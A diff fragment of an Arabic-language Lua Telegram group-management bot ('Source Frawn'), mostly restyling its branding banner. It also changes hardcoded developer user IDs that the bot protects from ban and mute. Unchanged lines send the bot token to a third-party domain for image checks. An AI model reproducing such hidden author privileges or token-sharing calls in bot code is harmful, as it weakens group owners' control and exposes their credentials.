 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/DEV_FRAWN&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -2997,7 +3036,7 @@ end
 
 if text == 'العاب فرعون' then
 local Text = [[
-𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍
+𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡
 ]]
 keyboard = {} keyboard.inline_keyboard = {
 {{text = 'فلابي بيرد', url="https://t.me/awesomebot?game=FlappyBird"},{text = 'تحداني فالرياضيات',url="https://t.me/gamebot?game=MathBattle"}},   
@@ -3025,7 +3064,7 @@ keyboard = {} keyboard.inline_keyboard = {
 {{text = 'SpaceTraveler', url="https://t.me/gamee?game=SpaceTraveler"},{text = 'RedAndBlue', url="https://t.me/gamee?game=RedAndBlue"}},  
 {{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
 {{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
-{{text = '𓆩𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍𓆪', url="t.me/source_frawn"}}, 
+{{text = '𓆩𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡𓆪', url="t.me/source_frawn"}}, 
 }  
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -3068,7 +3107,7 @@ GetFile_Bot(msg)
 end
 if text == 'الاوامر المضافه' and Constructor(msg) then
 local list = database:smembers(bot_id..'List:Cmd:Group:New'..msg.chat_id_..'')
-t = " ❍ قائمه الاوامر المضافه  \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = " ❍ قائمه الاوامر المضافه  \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 Cmds = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..v)
 print(Cmds)
@@ -3891,7 +3930,7 @@ return false
 end
 if text == ("قائمه العام") and DevSoFi(msg) then
 local list = database:smembers(bot_id..'GBan:User')
-t = "\n ❍ قائمة المحظورين عام \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة المحظورين عام \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -3921,16 +3960,16 @@ if result.sender_user_id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ❍ لا يمكنك حظر المطور الاساسي \n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1833835101) then
-send(msg.chat_id_, msg.id_, " ❍ لا يمكنك حظر مبرمج السورس\n")
+if result.sender_user_id_ == tonumber(1944028567) then
+send(msg.chat_id_, msg.id_, " ❍ لا يمكنك حظر المرمج الكبير فرعون\n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1635597460) then
-send(msg.chat_id_, msg.id_, " ❍ لا يمكنك حظر مالك السورس\n")
+if result.sender_user_id_ == tonumber(1779150039) then
+send(msg.chat_id_, msg.id_, " ❍ لا يمكنك حظر يوسف\n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1706080513) then
-send(msg.chat_id_, msg.id_, " ❍ لا يمكنك حظر المسلم\n")
+if result.sender_user_id_ == tonumber(936285607) then
+send(msg.chat_id_, msg.id_, " ❍ لا يمكنك حظر احمد \n")
 return false 
 end
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
@@ -4033,16 +4072,16 @@ if result.sender_user_id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ❍ لا يمكنك كتم المطور الاساسي \n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1833835101) then
+if result.sender_user_id_ == tonumber(1944028567) then
 send(msg.chat_id_, msg.id_, " ❍ لا يمكنك كتم مبرمج السورس\n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1635597460) then
-send(msg.chat_id_, msg.id_, " ❍ لا يمكنك كتم مالك السورس\n")
+if result.sender_user_id_ == tonumber(1779150039) then
+send(msg.chat_id_, msg.id_, " ❍ لا يمكنك كتم مبرمج² السورس\n")
 return false 
 end
 if result.sender_user_id_ == tonumber(1706080513) then
-send(msg.chat_id_, msg.id_, " ❍ لا يمكنك كتم المسلم\n")
+send(msg.chat_id_, msg.id_, " ❍ لا يمكنك كتم احمد\n")
 return false 
 end
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
@@ -4210,7 +4249,7 @@ send(msg.chat_id_, msg.id_, "\n ❍ تم مسح قائمة المطورين  ")
 end
 if text == ("المطورين") and DevSoFi(msg) then
 local list = database:smembers(bot_id..'Sudo:User')
-t = "\n ❍ قائمة مطورين البوت \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة مطورين البوت \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -4261,7 +4300,7 @@ end
 end
 
 if text == 'الملفات' and DevSoFi(msg) then
-t = ' ❍ ملفات السورس فرعون ↓\n ≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫ \n'
+t = ' ❍ ملفات السورس فرعون ↓\n ≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫ \n'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
 if v:match(".lua$") then
@@ -4278,8 +4317,8 @@ if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
 if Get_info then
-local TextS = "\n ❍ اهلا بك في متجر ملفات فرعون\n ❍ ملفات السورس ↓\n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n\n"
-local TextE = "\n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n ❍ علامة تعني { ✔️ } ملف مفعل\n ❍ علامة تعني { ✖ } ملف معطل\n ❍ قناة سورس فرعون ↓\n".." ❍ [اضغط هنا لدخول](t.me/source_frawn) \n"
+local TextS = "\n ❍ اهلا بك في متجر ملفات فرعون\n ❍ ملفات السورس ↓\n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n\n"
+local TextE = "\n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n ❍ علامة تعني { ✔️ } ملف مفعل\n ❍ علامة تعني { ✖ } ملف معطل\n ❍ قناة سورس فرعون ↓\n".." ❍ [اضغط هنا لدخول](t.me/source_frawn) \n"
 local NumFile = 0
 for name,Info in pairs(res.plugins_) do
 local Check_File_is_Found = io.open("File_Bot/"..name,"r")
@@ -4501,7 +4540,7 @@ end
 
 if text == 'قائمه فرعون' and Sudo(msg) then
 local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
-t = "\n ❍ قائمه فرعون \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمه فرعون \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -4518,7 +4557,7 @@ return false
 end
 if text == ("صيح للمالك") or text == ("تاك للمالك") then
 local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
-t = "\n ❍ وينكم تعالو يريدوكم بالجروب \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ وينكم تعالو يريدوكم بالجروب \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -4685,7 +4724,7 @@ st = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..ton
 eker = JSON.decode(st)
 if eker.ok.Info == "Indecent" then
 local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
-t = "❍ المنشئين الاساسين تعالو مخرب \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "❍ المنشئين الاساسين تعالو مخرب \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -4707,7 +4746,7 @@ Srrt = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..t
 Sto = JSON.decode(Srrt)
 if Sto.ok.Info == "Indecent" then
 local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
-t = "❍ المنشئين الاساسين تعالو مخرب \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "❍ المنشئين الاساسين تعالو مخرب \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -4794,7 +4833,7 @@ return false
 end
 if text == 'المنشئين الاساسين' and CoSu(msg) then
 local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
-t = "\n ❍ قائمة المنشئين الاساسين \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة المنشئين الاساسين \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -4811,7 +4850,7 @@ return false
 end
 if text == ("تاك للمنشئين الاساسين") or text == ("صيح المنشئين الاساسين") then
 local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
-t = "\n ❍ وينكم تعالو يريدوكم بالجروب \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ وينكم تعالو يريدوكم بالجروب \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -4979,7 +5018,7 @@ end
 
 if text == ("المنشئين") and BasicConstructor(msg) then
 local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
-t = "\n ❍ قائمة المنشئين \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة المنشئين \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -4995,7 +5034,7 @@ send(msg.chat_id_, msg.id_, t)
 end
 if text == ("تاك للمنشئين") or text == ("صيح المنشئين") then
 local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
-t = "\n ❍ وينكم تعالو يريدوكم بالجروب \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ وينكم تعالو يريدوكم بالجروب \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -5176,7 +5215,7 @@ send(msg.chat_id_, msg.id_, texts)
 end
 if text == ("المدراء") and Constructor(msg) then
 local list = database:smembers(bot_id..'Manager'..msg.chat_id_)
-t = "\n ❍ قائمة المدراء \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة المدراء \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -5192,7 +5231,7 @@ send(msg.chat_id_, msg.id_, t)
 end
 if text == ("تاك للمدراء") or text == ("صيح المدراء") then
 local list = database:smembers(bot_id..'Manager'..msg.chat_id_)
-t = "\n ❍ وينكم تعالو يريدوكم بالجروب \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ وينكم تعالو يريدوكم بالجروب \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -5412,7 +5451,7 @@ return false
 end
 if text == ("الثانويين") and SudoBot(msg) then
 local list = database:smembers(bot_id.."Dev:SoFi:2")
-t = "\n❍ قائمة مطورين الثانويين للبوت \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n❍ قائمة مطورين الثانويين للبوت \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -5463,7 +5502,7 @@ send(msg.chat_id_, msg.id_, ' ❍ تم مسح الادمنيه')
 end
 if text == ("الادمنيه") and Manager(msg) then
 local list = database:smembers(bot_id..'Mod:User'..msg.chat_id_)
-t = "\n ❍ قائمة الادمنيه \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة الادمنيه \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -5479,7 +5518,7 @@ send(msg.chat_id_, msg.id_, t)
 end
 if text == ("تاك للادمنيه") or text == ("صيح الادمنيه") then
 local list = database:smembers(bot_id..'Mod:User'..msg.chat_id_)
-t = "\n ❍ وينكم تعالو يريدوكم بالجروب \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ وينكم تعالو يريدوكم بالجروب \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -5655,7 +5694,7 @@ send(msg.chat_id_, msg.id_, ' ❍ تم مسح المنظفين')
 end
 if text == ("المنظفين") and BasicConstructor(msg) then
 local list = database:smembers(bot_id..'S00F4:MN:TF'..msg.chat_id_)
-t = "\n ❍ قائمة المنظفين \n≪━━━━━━𝓓𝓡𝓖━━━━━━≫\n"
+t = "\n ❍ قائمة المنظفين \n≪━━━━━━𝙁𝙍━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -5671,7 +5710,7 @@ send(msg.chat_id_, msg.id_, t)
 end
 if text == ("تاك للمنظفين") or text == ("صيح المنظفين") then
 local list = database:smembers(bot_id..'S00F4:MN:TF'..msg.chat_id_)
-t = "\n ❍ وينكم تعالو يريدوكم بالجروب \n≪━━━━━━𝓓𝓡𝓖━━━━━━≫\n"
+t = "\n ❍ وينكم تعالو يريدوكم بالجروب \n≪━━━━━━𝙁𝙍━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -5991,7 +6030,7 @@ send(msg.chat_id_, msg.id_, ' ❍ تم مسح المميزين')
 end
 if text == ("المميزين") and Mod(msg) then
 local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
-t = "\n ❍ قائمة مميزين الجروب \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة مميزين الجروب \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -6007,7 +6046,7 @@ send(msg.chat_id_, msg.id_, t)
 end
 if text == ("تاك للمميزين") or text == ("صيح المميزين") then
 local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
-t = "\n ❍ وينكم تعالو يريدوكم بالجروب \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ وينكم تعالو يريدوكم بالجروب \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -6186,7 +6225,7 @@ send(msg.chat_id_, msg.id_, ' ❍ تم مسح جميع المتوحدين')
 end
 if text == ("تاك للمتوحدين") and Mod(msg) then
 local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
-t = "\n ❍ قائمة متوحدين الجروب \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة متوحدين الجروب \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -6255,7 +6294,7 @@ send(msg.chat_id_, msg.id_, ' ❍ تم مسح جميع الزوجات')
 end
 if text == ("تاك للزوجات") and Mod(msg) then
 local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
-t = "\n ❍ قائمه زوجات الجروب \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمه زوجات الجروب \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -6324,7 +6363,7 @@ send(msg.chat_id_, msg.id_, ' ❍ تم مسح جميع الكلاب')
 end
 if text == ("تاك للكلاب") and Mod(msg) then
 local list = database:smembers(bot_id..'Modde:User'..msg.chat_id_)
-t = "\n ❍ قائمه كلاب الجروب \nٴ≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫ٴ\n"
+t = "\n ❍ قائمه كلاب الجروب \nٴ≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫ٴ\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -6393,7 +6432,7 @@ send(msg.chat_id_, msg.id_, ' ❍ تم تنزيل جميع حمير من الج�
 end
 if text == ("تاك للحمير") and Mod(msg) then
 local list = database:smembers(bot_id..'Sakl:User'..msg.chat_id_)
-t = "\n ❍ قائمة حمير الجروب \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة حمير الجروب \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -6463,7 +6502,7 @@ send(msg.chat_id_, msg.id_, ' ❍ تم تنزيل جميع وتكات الجرو
 end
 if text == ("تاك للوتكات") and Mod(msg) then
 local list = database:smembers(bot_id..'Motte:User'..msg.chat_id_)
-t = "\n ❍ قائمة وتكات الجروب \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة وتكات الجروب \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -6532,7 +6571,7 @@ send(msg.chat_id_, msg.id_, ' ❍ تم تنزيل جميع القرده بالج
 end
 if text == ("تاك للقرود") and Mod(msg) then
 local list = database:smembers(bot_id..'Motee:User'..msg.chat_id_)
-t = "\n ❍ قائمة القرود الجروب \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة القرود الجروب \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -6601,7 +6640,7 @@ send(msg.chat_id_, msg.id_, ' ❍ تم تنزيل جميع الارامل بال
 end
 if text == ("تاك للارامل") and Mod(msg) then
 local list = database:smembers(bot_id..'Bro:User'..msg.chat_id_)
-t = "\n ❍ قائمة ارامل الجروب \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة ارامل الجروب \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -6670,7 +6709,7 @@ send(msg.chat_id_, msg.id_, ' ❍ تم تنزيل جميع الخولات بال
 end
 if text == ("تاك للخولات") and Mod(msg) then
 local list = database:smembers(bot_id..'Girl:User'..msg.chat_id_)
-t = "\n ❍ قائمة خولات الجروب \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة خولات الجروب \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -6739,7 +6778,7 @@ send(msg.chat_id_, msg.id_, ' ❍ تم تنزيل جميع البقرات بال
 end
 if text == ("تاك للبقرات") and Mod(msg) then
 local list = database:smembers(bot_id..'Bakra:User'..msg.chat_id_)
-t = "\n ❍ قائمة البقرات الجروب \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة البقرات الجروب \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -6808,7 +6847,7 @@ send(msg.chat_id_, msg.id_, ' ❍ تم تنزيل جميع المزز بالجر
 end
 if text == ("تاك للمزز") and Mod(msg) then
 local list = database:smembers(bot_id..'Tele:User'..msg.chat_id_)
-t = "\n ❍ قائمة مزز الجروب \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة مزز الجروب \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -6877,7 +6916,7 @@ send(msg.chat_id_, msg.id_, ' ❍ تم تنزيل جميع االاكساس')
 end
 if text == ("تاك للاكساس") and Mod(msg) then
 local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
-t = "\n ❍ قائمة كساس الجروب \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة كساس الجروب \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -6946,7 +6985,7 @@ send(msg.chat_id_, msg.id_, '\n ❍ تم مسح المحظورين')
 end
 if text == ("المحظورين") then
 local list = database:smembers(bot_id..'Ban:User'..msg.chat_id_)
-t = "\n ❍ قائمة محظورين الجروب \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة محظورين الجروب \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -7186,7 +7225,7 @@ send(msg.chat_id_, msg.id_, ' ❍ تم مسح المكتومين')
 end
 if text == ("المكتومين") and Mod(msg) then
 local list = database:smembers(bot_id..'Muted:User'..msg.chat_id_)
-t = "\n ❍ قائمة المكتومين \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة المكتومين \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -8318,10 +8357,10 @@ local text =
 '\n𝙶𝚁𝙾𝚄𝙿 𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂'..
 '\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ '..
 '\n ❍ اعدادات الجروب كتالي √↓'..
-'\nء≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫'..
+'\nء≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫'..
 '\n ❍  علامة ال {🔓} تعني مفعل'..
 '\n ❍  علامة ال {🔐} تعني معطل'..
-'\nء≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫'..
+'\nء≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫'..
 '\n ❍  الروابط » { '..lock_links..
 ' }\n'..' ❍  المعرفات » { '..lock_user..
 ' }\n'..' ❍  التاك » { '..lock_hash..
@@ -8332,7 +8371,7 @@ local text =
 ' }\n'..' ❍  الماركدون » { '..lock_mark..
 ' }\n'..' ❍  التعديل » { '..lock_edit..
 ' }\n'..' ❍  تعديل الميديا » { '..lock_edit_med..
-' }\nء≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫'..
+' }\nء≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫'..
 '\n'..' ❍  الكلايش » { '..lock_spam..
 ' }\n'..' ❍  الكيبورد » { '..lock_inlin..
 ' }\n'..' ❍  الاغاني » { '..lock_vico..
@@ -8341,7 +8380,7 @@ local text =
 ' }\n'..' ❍  الدردشه » { '..lock_text..
 ' }\n'..' ❍   الفيديو » { '..lock_ved..
 ' }\n'..' ❍   الصور » { '..lock_photo..
-' }\nء≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫'..
+' }\nء≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫'..
